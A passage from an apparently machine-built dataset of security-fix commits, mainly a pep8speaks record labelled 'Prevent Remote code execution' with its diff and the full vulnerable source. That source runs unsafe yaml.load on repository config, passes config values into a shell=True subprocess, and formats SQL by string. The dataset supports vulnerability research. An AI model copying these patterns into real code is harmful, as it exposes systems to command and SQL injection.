duts:\n        check_device(devices, setup_params, dut)\n    for ref in refs:\n        check_device(devices, setup_params, ref)\n    for monitor in monitors:\n        if monitor == \"all\":\n            continue\n        check_device(devices, setup_params, monitor, monitor=True)\n"}},"msg":"tests\/remote: Fix execution of setup_hw\n\nThe code contained some places that used an additional argument for\nsetup_hw after -R and also contained places where setup_hw cmdline was\npassed as a string instead of an argument list. It also contained places\nwhere the ifname was only treated as a single interface and disregarded\nthe possiblity of multiple interfaces. This commit fixes these issues\nand executes setup_hw from a single function for all cases.\n\nSigned-off-by: Jonathan Afek <jonathanx.afek@intel.com>"}},"https:\/\/github.com\/OrkoHunter\/pep8speaks":{"e09ec28786aa04bb7a6459fec6294bbb9368671a":{"url":"https:\/\/api.github.com\/repos\/OrkoHunter\/pep8speaks\/commits\/e09ec28786aa04bb7a6459fec6294bbb9368671a","html_url":"https:\/\/github.com\/OrkoHunter\/pep8speaks\/commit\/e09ec28786aa04bb7a6459fec6294bbb9368671a","message":"Prevent Remote code execution, Closes #28","sha":"e09ec28786aa04bb7a6459fec6294bbb9368671a","keyword":"remote code execution prevent","diff":"diff --git a\/pep8speaks\/helpers.py b\/pep8speaks\/helpers.py\nindex f65732c..c5ec39d 100644\n--- a\/pep8speaks\/helpers.py\n+++ b\/pep8speaks\/helpers.py\n@@ -51,13 +51,14 @@ def update_dict(base, head):\n     Source : http:\/\/stackoverflow.com\/a\/32357112\/4698026\n     \"\"\"\n     for key, value in head.items():\n-        if isinstance(base, collections.Mapping):\n-            if isinstance(value, collections.Mapping):\n-                base[key] = update_dict(base.get(key, {}), value)\n+        if key in base:\n+            if isinstance(base, collections.Mapping):\n+                if isinstance(value, collections.Mapping):\n+                    base[key] = update_dict(base.get(key, {}), value)\n+                else:\n+                    base[key] = head[key]\n             else:\n-                base[key] = head[key]\n-        else:\n-            base = {key: head[key]}\n+                base = {key: head[key]}\n     return base\n \n \n","files":{"\/pep8speaks\/helpers.py":{"changes":[{"diff":"\n     Source : http:\/\/stackoverflow.com\/a\/32357112\/4698026\n     \"\"\"\n     for key, value in head.items():\n-        if isinstance(base, collections.Mapping):\n-            if isinstance(value, collections.Mapping):\n-                base[key] = update_dict(base.get(key, {}), value)\n+        if key in base:\n+            if isinstance(base, collections.Mapping):\n+                if isinstance(value, collections.Mapping):\n+                    base[key] = update_dict(base.get(key, {}), value)\n+                else:\n+                    base[key] = head[key]\n             else:\n-                base[key] = head[key]\n-        else:\n-            base = {key: head[key]}\n+                base = {key: head[key]}\n     return base\n \n \n","add":7,"remove":6,"filename":"\/pep8speaks\/helpers.py","badparts":["        if isinstance(base, collections.Mapping):","            if isinstance(value, collections.Mapping):","                base[key] = update_dict(base.get(key, {}), value)","                base[key] = head[key]","        else:","            base = {key: head[key]}"],"goodparts":["        if key in base:","            if isinstance(base, collections.Mapping):","                if isinstance(value, collections.Mapping):","                    base[key] = update_dict(base.get(key, {}), value)","                else:","                    base[key] = head[key]","                base = {key: head[key]}"]},{"diff":"\n     Source : http:\/\/stackoverflow.com\/a\/32357112\/4698026\n     \"\"\"\n     for key, value in head.items():\n-        if isinstance(base, collections.Mapping):\n-            if isinstance(value, collections.Mapping):\n-                base[key] = update_dict(base.get(key, {}), value)\n+        if key in base:\n+            if isinstance(base, collections.Mapping):\n+                if isinstance(value, collections.Mapping):\n+                    base[key] = update_dict(base.get(key, {}), value)\n+                else:\n+                    base[key] = head[key]\n             else:\n-                base[key] = head[key]\n-        else:\n-            base = {key: head[key]}\n+                base = {key: head[key]}\n     return base\n \n \n","add":7,"remove":6,"filename":"\/pep8speaks\/helpers.py","badparts":["        if isinstance(base, collections.Mapping):","            if isinstance(value, collections.Mapping):","                base[key] = update_dict(base.get(key, {}), value)","                base[key] = head[key]","        else:","            base = {key: head[key]}"],"goodparts":["        if key in base:","            if isinstance(base, collections.Mapping):","                if isinstance(value, collections.Mapping):","                    base[key] = update_dict(base.get(key, {}), value)","                else:","                    base[key] = head[key]","                base = {key: head[key]}"]}],"source":"\n import base64 import collections import datetime import hmac import json import os import re import subprocess import time import psycopg2 import requests import unidiff import yaml from flask import abort def update_users(repository): \"\"\"Update users of the integration in the database\"\"\" if os.environ.get(\"OVER_HEROKU\", False) is not False: query=r\"INSERT INTO Users(repository, created_at) VALUES('{}', now());\" \\ \"\".format(repository) try: cursor.execute(query) conn.commit() except psycopg2.IntegrityError: conn.rollback() def follow_user(user): \"\"\"Follow the user of the service\"\"\" headers={ \"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"], \"Content-Length\": \"0\", } auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https:\/\/api.github.com\/user\/following\/{}\" url=url.format(user) r=requests.put(url, headers=headers, auth=auth) def update_dict(base, head): \"\"\" Recursively merge or update dict-like objects. >>> update({'k1': 1},{'k1':{'k2':{'k3': 3}}}) Source: http:\/\/stackoverflow.com\/a\/32357112\/4698026 \"\"\" for key, value in head.items(): if isinstance(base, collections.Mapping): if isinstance(value, collections.Mapping): base[key]=update_dict(base.get(key,{}), value) else: base[key]=head[key] else: base={key: head[key]} return base def match_webhook_secret(request): \"\"\"Match the webhook secret sent from GitHub\"\"\" if os.environ.get(\"OVER_HEROKU\", False) is not False: header_signature=request.headers.get('X-Hub-Signature') if header_signature is None: abort(403) sha_name, signature=header_signature.split('=') if sha_name !='sha1': abort(501) mac=hmac.new(os.environ[\"GITHUB_PAYLOAD_SECRET\"].encode(), msg=request.data, digestmod=\"sha1\") if not hmac.compare_digest(str(mac.hexdigest()), str(signature)): abort(403) return True def check_pythonic_pr(data): \"\"\" Return True if the PR contains at least one Python file \"\"\" files=list(get_files_involved_in_pr(data).keys()) pythonic=False for file in files: if file[-3:]=='.py': pythonic=True break return pythonic def get_config(data): \"\"\" Get.pep8speaks.yml config file from the repository and return the config dictionary \"\"\" config={ \"message\":{ \"opened\":{ \"header\": \"\", \"footer\": \"\" }, \"updated\":{ \"header\": \"\", \"footer\": \"\" } }, \"scanner\":{\"diff_only\": False}, \"pycodestyle\":{ \"ignore\":[], \"max-line-length\": 79, \"count\": False, \"first\": False, \"show-pep8\": False, \"filename\":[], \"exclude\":[], \"select\":[], \"show-source\": False, \"statistics\": False, \"hang-closing\": False, }, \"no_blank_comment\": True, \"only_mention_files_with_errors\": True, } headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https:\/\/raw.githubusercontent.com\/{}\/{}\/.pep8speaks.yml\" url=url.format(data[\"repository\"], data[\"after_commit_hash\"]) r=requests.get(url, headers=headers, auth=auth) if r.status_code==200: try: new_config=yaml.load(r.text) config=update_dict(config, new_config) except yaml.YAMLError: pass arguments=[] confs=config[\"pycodestyle\"] for key, value in confs.items(): if value: if isinstance(value, int): if isinstance(value, bool): arguments.append(\"--{}\".format(key)) else: arguments.append(\"--{}={}\".format(key, value)) elif isinstance(value, list): arguments.append(\"--{}={}\".format(key, ','.join(value))) config[\"pycodestyle_cmd_config\"]='{arguments}'.format(arguments=' '.join(arguments)) config[\"pycodestyle\"][\"ignore\"]=[e.upper() for e in list(config[\"pycodestyle\"][\"ignore\"])] return config def get_files_involved_in_pr(data): \"\"\" Return a list of file names modified\/added in the PR \"\"\" headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} diff_headers=headers.copy() diff_headers[\"Accept\"]=\"application\/vnd.github.VERSION.diff\" auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) repository=data[\"repository\"] after_commit_hash=data[\"after_commit_hash\"] author=data[\"author\"] diff_url=\"https:\/\/api.github.com\/repos\/{}\/pulls\/{}\" diff_url=diff_url.format(repository, str(data[\"pr_number\"])) r=requests.get(diff_url, headers=diff_headers, auth=auth) patch=unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding) files={} for patchset in patch: file=patchset.target_file[1:] files[file]=[] for hunk in patchset: for line in hunk.target_lines(): if line.is_added: files[file].append(line.target_line_no) return files def get_python_files_involved_in_pr(data): files=get_files_involved_in_pr(data) for file in list(files.keys()): if file[-3:] !=\".py\": del files[file] return files def run_pycodestyle(data, config): \"\"\" Run pycodestyle script on the files and update the data dictionary \"\"\" headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) repository=data[\"repository\"] after_commit_hash=data[\"after_commit_hash\"] author=data[\"author\"] py_files=get_python_files_involved_in_pr(data) for file in py_files: filename=file[1:] url=\"https:\/\/raw.githubusercontent.com\/{}\/{}\/{}\" url=url.format(repository, after_commit_hash, file) r=requests.get(url, headers=headers, auth=auth) with open(\"file_to_check.py\", 'w+', encoding=r.encoding) as file_to_check: file_to_check.write(r.text) cmd='pycodestyle{config[pycodestyle_cmd_config]} file_to_check.py'.format( config=config) proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) stdout, _=proc.communicate() data[\"extra_results\"][filename]=stdout.decode(r.encoding).splitlines() data[\"results\"][filename]=[] for error in list(data[\"extra_results\"][filename]): if re.search(\"^file_to_check.py:\\d+:\\d+:\\s[WE]\\d+\\s.*\", error): data[\"results\"][filename].append(error.replace(\"file_to_check.py\", filename)) data[\"extra_results\"][filename].remove(error) for error in list(data[\"results\"][filename]): if config[\"scanner\"][\"diff_only\"]: if not int(error.split(\":\")[1]) in py_files[file]: data[\"results\"][filename].remove(error) url=\"https:\/\/github.com\/{}\/blob\/{}{}\" data[filename +\"_link\"]=url.format(repository, after_commit_hash, file) os.remove(\"file_to_check.py\") def prepare_comment(request, data, config): \"\"\"Construct the string of comment i.e. its header, body and footer\"\"\" author=data[\"author\"] comment_header=\"\" if request.json[\"action\"]==\"opened\": if config[\"message\"][\"opened\"][\"header\"]==\"\": comment_header=\"Hello @\" +author +\"! Thanks for submitting the PR.\\n\\n\" else: comment_header=config[\"message\"][\"opened\"][\"header\"] +\"\\n\\n\" elif request.json[\"action\"] in[\"synchronize\", \"reopened\"]: if config[\"message\"][\"updated\"][\"header\"]==\"\": comment_header=\"Hello @\" +author +\"! Thanks for updating the PR.\\n\\n\" else: comment_header=config[\"message\"][\"updated\"][\"header\"] +\"\\n\\n\" ERROR=False comment_body=[] for file, issues in data[\"results\"].items(): if len(issues)==0: if not config[\"only_mention_files_with_errors\"]: comment_body.append( \" -There are no PEP8 issues in the\" \" file[`{0}`]({1}) !\".format(file, data[file +\"_link\"])) else: ERROR=True comment_body.append( \" -In the file[`{0}`]({1}), following \" \"are the PEP8 issues:\\n\".format(file, data[file +\"_link\"])) for issue in issues: error_string=issue.replace(file +\":\", \"Line \") error_string_list=error_string.split(\" \") code=error_string_list[2] code_url=\"https:\/\/duckduckgo.com\/?q=pep8%20{0}\".format(code) error_string_list[2]=\"[{0}]({1})\".format(code, code_url) line, col=error_string_list[1][:-1].split(\":\") line_url=data[file +\"_link\"] +\" error_string_list[1]=\"[{0}:{1}]({2}):\".format(line, col, line_url) error_string=\" \".join(error_string_list) error_string=error_string.replace(\"Line[\", \"[Line \") comment_body.append(\"\\n>{0}\".format(error_string)) comment_body.append(\"\\n\\n\") if len(data[\"extra_results\"][file]) > 0: comment_body.append(\" -Complete extra results for this file:\\n\\n\") comment_body.append(\"> \" +\"\".join(data[\"extra_results\"][file])) comment_body.append(\"---\\n\\n\") if config[\"only_mention_files_with_errors\"] and not ERROR: comment_body.append(\"Cheers ! There are no PEP8 issues in this Pull Request.:beers: \") comment_body=''.join(comment_body) comment_footer=[] if request.json[\"action\"]==\"opened\": comment_footer.append(config[\"message\"][\"opened\"][\"footer\"]) elif request.json[\"action\"] in[\"synchronize\", \"reopened\"]: comment_footer.append(config[\"message\"][\"updated\"][\"footer\"]) comment_footer=''.join(comment_footer) return comment_header, comment_body, comment_footer, ERROR def comment_permission_check(data, comment): \"\"\"Check for quite and resume status or duplicate comments\"\"\" PERMITTED_TO_COMMENT=True repository=data[\"repository\"] headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https:\/\/api.github.com\/repos\/{}\/issues\/{}\/comments\" url=url.format(repository, str(data[\"pr_number\"])) comments=requests.get(url, headers=headers, auth=auth).json() last_comment=\"\" for old_comment in reversed(comments): if old_comment[\"user\"][\"id\"]==24736507: last_comment=old_comment[\"body\"] break \"\"\" text1=''.join(BeautifulSoup(markdown(comment)).findAll(text=True)) text2=''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True)) if text1==text2.replace(\"submitting\", \"updating\"): PERMITTED_TO_COMMENT=False \"\"\" for old_comment in reversed(comments): if '@pep8speaks' in old_comment['body']: if 'resume' in old_comment['body'].lower(): break elif 'quiet' in old_comment['body'].lower(): PERMITTED_TO_COMMENT=False return PERMITTED_TO_COMMENT def create_or_update_comment(data, comment): comment_mode=None headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) query=\"https:\/\/api.github.com\/repos\/{}\/issues\/{}\/comments\" query=query.format(data[\"repository\"], str(data[\"pr_number\"])) comments=requests.get(query, headers=headers, auth=auth).json() last_comment_id=None for old_comment in comments: if old_comment[\"user\"][\"id\"]==24736507: last_comment_id=old_comment[\"id\"] break if last_comment_id is None: response=requests.post(query, json={\"body\": comment}, headers=headers, auth=auth) data[\"comment_response\"]=response.json() else: utc_time=datetime.datetime.utcnow() time_now=utc_time.strftime(\"%B %d, %Y at %H:%M Hours UTC\") comment +=\"\\n\\n comment=comment.format(time_now) query=\"https:\/\/api.github.com\/repos\/{}\/issues\/comments\/{}\" query=query.format(data[\"repository\"], str(last_comment_id)) response=requests.patch(query, json={\"body\": comment}, headers=headers, auth=auth) def autopep8(data, config): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(data[\"diff_url\"], headers=headers, auth=auth) patch=unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding) py_files={} for patchset in patch: if patchset.target_file[-3:]=='.py': py_file=patchset.target_file[1:] py_files[py_file]=[] for hunk in patchset: for line in hunk.target_lines(): if line.is_added: py_files[py_file].append(line.target_line_no) to_ignore=\",\".join(config[\"pycodestyle\"][\"ignore\"]) arg_to_ignore=\"\" if len(to_ignore) > 0: arg_to_ignore=\"--ignore \" +to_ignore for file in py_files: filename=file[1:] url=\"https:\/\/raw.githubusercontent.com\/{}\/{}\/{}\" url=url.format(data[\"repository\"], data[\"sha\"], file) r=requests.get(url, headers=headers, auth=auth) with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix: file_to_fix.write(r.text) cmd='autopep8 file_to_fix.py --diff{arg_to_ignore}'.format( arg_to_ignore=arg_to_ignore) proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) stdout, _=proc.communicate() data[\"diff\"][filename]=stdout.decode(r.encoding) data[\"diff\"][filename]=data[\"diff\"][filename].replace(\"file_to_check.py\", filename) data[\"diff\"][filename]=data[\"diff\"][filename].replace(\"\\\\\", \"\\\\\\\\\") url=\"https:\/\/github.com\/{}\/blob\/{}{}\" data[filename +\"_link\"]=url.format(data[\"repository\"], data[\"sha\"], file) os.remove(\"file_to_fix.py\") def create_gist(data, config): \"\"\"Create gists for diff files\"\"\" REQUEST_JSON={} REQUEST_JSON[\"public\"]=True REQUEST_JSON[\"files\"]={} REQUEST_JSON[\"description\"]=\"In response to @{0}'s comment:{1}\".format( data[\"reviewer\"], data[\"review_url\"]) for file, diffs in data[\"diff\"].items(): if len(diffs) !=0: REQUEST_JSON[\"files\"][file.split(\"\/\")[-1] +\".diff\"]={ \"content\": diffs } headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https:\/\/api.github.com\/gists\" res=requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json() data[\"gist_response\"]=res data[\"gist_url\"]=res[\"html_url\"] def delete_if_forked(data): FORKED=False url=\"https:\/\/api.github.com\/user\/repos\" headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(url, headers=headers, auth=auth) for repo in r.json(): if repo[\"description\"]: if data[\"target_repo_fullname\"] in repo[\"description\"]: FORKED=True r=requests.delete(\"https:\/\/api.github.com\/repos\/\" \"{}\".format(repo[\"full_name\"]), headers=headers, auth=auth) return FORKED def fork_for_pr(data): FORKED=False url=\"https:\/\/api.github.com\/repos\/{}\/forks\" url=url.format(data[\"target_repo_fullname\"]) headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.post(url, headers=headers, auth=auth) if r.status_code==202: data[\"fork_fullname\"]=r.json()[\"full_name\"] FORKED=True else: data[\"error\"]=\"Unable to fork\" return FORKED def update_fork_desc(data): url=\"https:\/\/api.github.com\/repos\/{}\".format(data[\"fork_fullname\"]) headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(url, headers=headers, auth=auth) ATTEMPT=0 while(r.status_code !=200): time.sleep(5) r=requests.get(url, headers=headers, auth=auth) ATTEMPT +=1 if ATTEMPT > 10: data[\"error\"]=\"Forking is taking more than usual time\" break full_name=data[\"target_repo_fullname\"] author, name=full_name.split(\"\/\") request_json={ \"name\": name, \"description\": \"Forked from @{}'s{}\".format(author, full_name) } r=requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth) if r.status_code !=200: data[\"error\"]=\"Could not update description of the fork\" def create_new_branch(data): url=\"https:\/\/api.github.com\/repos\/{}\/git\/refs\/heads\" url=url.format(data[\"fork_fullname\"]) headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) sha=None r=requests.get(url, headers=headers, auth=auth) for ref in r.json(): if ref[\"ref\"].split(\"\/\")[-1]==data[\"target_repo_branch\"]: sha=ref[\"object\"][\"sha\"] url=\"https:\/\/api.github.com\/repos\/{}\/git\/refs\" url=url.format(data[\"fork_fullname\"]) data[\"new_branch\"]=\"{}-pep8-patch\".format(data[\"target_repo_branch\"]) request_json={ \"ref\": \"refs\/heads\/{}\".format(data[\"new_branch\"]), \"sha\": sha, } r=requests.post(url, json=request_json, headers=headers, auth=auth) if r.status_code !=200: data[\"error\"]=\"Could not create new branch in the fork\" def autopep8ify(data, config): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) r=requests.get(data[\"diff_url\"], headers=headers, auth=auth) patch=unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding) py_files={} for patchset in patch: if patchset.target_file[-3:]=='.py': py_file=patchset.target_file[1:] py_files[py_file]=[] for hunk in patchset: for line in hunk.target_lines(): if line.is_added: py_files[py_file].append(line.target_line_no) to_ignore=\",\".join(config[\"pycodestyle\"][\"ignore\"]) arg_to_ignore=\"\" if len(to_ignore) > 0: arg_to_ignore=\"--ignore \" +to_ignore for file in py_files: filename=file[1:] url=\"https:\/\/raw.githubusercontent.com\/{}\/{}\/{}\" url=url.format(data[\"repository\"], data[\"sha\"], file) r=requests.get(url, headers=headers, auth=auth) with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix: file_to_fix.write(r.text) cmd='autopep8 file_to_fix.py{arg_to_ignore}'.format( arg_to_ignore=arg_to_ignore) proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE) stdout, _=proc.communicate() data[\"results\"][filename]=stdout.decode(r.encoding) os.remove(\"file_to_fix.py\") def commit(data): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) fullname=data.get(\"fork_fullname\") for file, new_file in data[\"results\"].items(): url=\"https:\/\/api.github.com\/repos\/{}\/contents\/{}\" url=url.format(fullname, file) params={\"ref\": data[\"new_branch\"]} r=requests.get(url, params=params, headers=headers, auth=auth) sha_blob=r.json().get(\"sha\") params[\"path\"]=file content_code=base64.b64encode(new_file.encode()).decode(\"utf-8\") request_json={ \"path\": file, \"message\": \"Fix pep8 errors in{}\".format(file), \"content\": content_code, \"sha\": sha_blob, \"branch\": data.get(\"new_branch\"), } r=requests.put(url, json=request_json, headers=headers, auth=auth) def create_pr(data): headers={\"Authorization\": \"token \" +os.environ[\"GITHUB_TOKEN\"]} auth=(os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"]) url=\"https:\/\/api.github.com\/repos\/{}\/pulls\" url=url.format(data[\"target_repo_fullname\"]) request_json={ \"title\": \"Fix pep8 errors\", \"head\": \"pep8speaks:{}\".format(data[\"new_branch\"]), \"base\": data[\"target_repo_branch\"], \"body\": \"The changes are suggested by autopep8\", } r=requests.post(url, json=request_json, headers=headers, auth=auth) if r.status_code==201: data[\"pr_url\"]=r.json()[\"html_url\"] else: data[\"error\"]=\"Pull request could not be created\" ","sourceWithComments":"# -*- coding: utf-8 -*-\n\nimport base64\nimport collections\nimport datetime\nimport hmac\nimport json\nimport os\nimport re\nimport subprocess\nimport time\n\nimport psycopg2\nimport requests\nimport unidiff\nimport yaml\nfrom flask import abort\n\n\ndef update_users(repository):\n    \"\"\"Update users of the integration in the database\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        # Check if repository exists in database\n        query = r\"INSERT INTO Users (repository, created_at) VALUES ('{}', now());\" \\\n                \"\".format(repository)\n\n        try:\n            cursor.execute(query)\n            conn.commit()\n        except psycopg2.IntegrityError:  # If already exists\n            conn.rollback()\n\n\ndef follow_user(user):\n    \"\"\"Follow the user of the service\"\"\"\n    headers = {\n        \"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"],\n        \"Content-Length\": \"0\",\n    }\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https:\/\/api.github.com\/user\/following\/{}\"\n    url = url.format(user)\n    r = requests.put(url, headers=headers, auth=auth)\n\n\ndef update_dict(base, head):\n    \"\"\"\n    Recursively merge or update dict-like objects.\n    >>> update({'k1': 1}, {'k1': {'k2': {'k3': 3}}})\n\n    Source : http:\/\/stackoverflow.com\/a\/32357112\/4698026\n    \"\"\"\n    for key, value in head.items():\n        if isinstance(base, collections.Mapping):\n            if isinstance(value, collections.Mapping):\n                base[key] = update_dict(base.get(key, {}), value)\n            else:\n                base[key] = head[key]\n        else:\n            base = {key: head[key]}\n    return base\n\n\ndef match_webhook_secret(request):\n    \"\"\"Match the webhook secret sent from GitHub\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        header_signature = request.headers.get('X-Hub-Signature')\n        if header_signature is None:\n            abort(403)\n        sha_name, signature = header_signature.split('=')\n        if sha_name != 'sha1':\n            abort(501)\n        mac = hmac.new(os.environ[\"GITHUB_PAYLOAD_SECRET\"].encode(), msg=request.data,\n                       digestmod=\"sha1\")\n        if not hmac.compare_digest(str(mac.hexdigest()), str(signature)):\n            abort(403)\n    return True\n\n\ndef check_pythonic_pr(data):\n    \"\"\"\n    Return True if the PR contains at least one Python file\n    \"\"\"\n    files = list(get_files_involved_in_pr(data).keys())\n    pythonic = False\n    for file in files:\n        if file[-3:] == '.py':\n            pythonic = True\n            break\n\n    return pythonic\n\n\ndef get_config(data):\n    \"\"\"\n    Get .pep8speaks.yml config file from the repository and return\n    the config dictionary\n    \"\"\"\n\n    # Default configuration parameters\n    config = {\n        \"message\": {\n            \"opened\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            },\n            \"updated\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            }\n        },\n        \"scanner\": {\"diff_only\": False},\n        \"pycodestyle\": {\n            \"ignore\": [],\n            \"max-line-length\": 79,\n            \"count\": False,\n            \"first\": False,\n            \"show-pep8\": False,\n            \"filename\": [],\n            \"exclude\": [],\n            \"select\": [],\n            \"show-source\": False,\n            \"statistics\": False,\n            \"hang-closing\": False,\n        },\n        \"no_blank_comment\": True,\n        \"only_mention_files_with_errors\": True,\n    }\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Configuration file\n    url = \"https:\/\/raw.githubusercontent.com\/{}\/{}\/.pep8speaks.yml\"\n\n    url = url.format(data[\"repository\"], data[\"after_commit_hash\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    if r.status_code == 200:\n        try:\n            new_config = yaml.load(r.text)\n            # overloading the default configuration with the one specified\n            config = update_dict(config, new_config)\n        except yaml.YAMLError:  # Bad YAML file\n            pass\n\n    # Create pycodestyle command line arguments\n    arguments = []\n    confs = config[\"pycodestyle\"]\n    for key, value in confs.items():\n        if value:  # Non empty\n            if isinstance(value, int):\n                if isinstance(value, bool):\n                    arguments.append(\"--{}\".format(key))\n                else:\n                    arguments.append(\"--{}={}\".format(key, value))\n            elif isinstance(value, list):\n                arguments.append(\"--{}={}\".format(key, ','.join(value)))\n    config[\"pycodestyle_cmd_config\"] = ' {arguments}'.format(arguments=' '.join(arguments))\n\n    # pycodestyle is case-sensitive\n    config[\"pycodestyle\"][\"ignore\"] = [e.upper() for e in list(config[\"pycodestyle\"][\"ignore\"])]\n\n    return config\n\n\ndef get_files_involved_in_pr(data):\n    \"\"\"\n    Return a list of file names modified\/added in the PR\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    diff_headers = headers.copy()\n    diff_headers[\"Accept\"] = \"application\/vnd.github.VERSION.diff\"\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n    diff_url = \"https:\/\/api.github.com\/repos\/{}\/pulls\/{}\"\n    diff_url = diff_url.format(repository, str(data[\"pr_number\"]))\n    r = requests.get(diff_url, headers=diff_headers, auth=auth)\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    files = {}\n\n    for patchset in patch:\n        file = patchset.target_file[1:]\n        files[file] = []\n        for hunk in patchset:\n            for line in hunk.target_lines():\n                if line.is_added:\n                    files[file].append(line.target_line_no)\n\n    return files\n\n\ndef get_python_files_involved_in_pr(data):\n    files = get_files_involved_in_pr(data)\n    for file in list(files.keys()):\n        if file[-3:] != \".py\":\n            del files[file]\n\n    return files\n\n\ndef run_pycodestyle(data, config):\n    \"\"\"\n    Run pycodestyle script on the files and update the data\n    dictionary\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n\n    # Run pycodestyle\n    ## All the python files with additions\n    # A dictionary with filename paired with list of new line numbers\n    py_files = get_python_files_involved_in_pr(data)\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https:\/\/raw.githubusercontent.com\/{}\/{}\/{}\"\n        url = url.format(repository, after_commit_hash, file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_check.py\", 'w+', encoding=r.encoding) as file_to_check:\n            file_to_check.write(r.text)\n\n        # Use the command line here\n        cmd = 'pycodestyle {config[pycodestyle_cmd_config]} file_to_check.py'.format(\n            config=config)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"extra_results\"][filename] = stdout.decode(r.encoding).splitlines()\n\n        # Put only relevant errors in the data[\"results\"] dictionary\n        data[\"results\"][filename] = []\n        for error in list(data[\"extra_results\"][filename]):\n            if re.search(\"^file_to_check.py:\\d+:\\d+:\\s[WE]\\d+\\s.*\", error):\n                data[\"results\"][filename].append(error.replace(\"file_to_check.py\", filename))\n                data[\"extra_results\"][filename].remove(error)\n\n        ## Remove errors in case of diff_only = True\n        ## which are caused in the whole file\n        for error in list(data[\"results\"][filename]):\n            if config[\"scanner\"][\"diff_only\"]:\n                if not int(error.split(\":\")[1]) in py_files[file]:\n                    data[\"results\"][filename].remove(error)\n\n        ## Store the link to the file\n        url = \"https:\/\/github.com\/{}\/blob\/{}{}\"\n        data[filename + \"_link\"] = url.format(repository, after_commit_hash, file)\n        os.remove(\"file_to_check.py\")\n\n\ndef prepare_comment(request, data, config):\n    \"\"\"Construct the string of comment i.e. its header, body and footer\"\"\"\n    author = data[\"author\"]\n    # Write the comment body\n    ## Header\n    comment_header = \"\"\n    if request.json[\"action\"] == \"opened\":\n        if config[\"message\"][\"opened\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for submitting the PR.\\n\\n\"\n        else:\n            comment_header = config[\"message\"][\"opened\"][\"header\"] + \"\\n\\n\"\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        if config[\"message\"][\"updated\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for updating the PR.\\n\\n\"\n        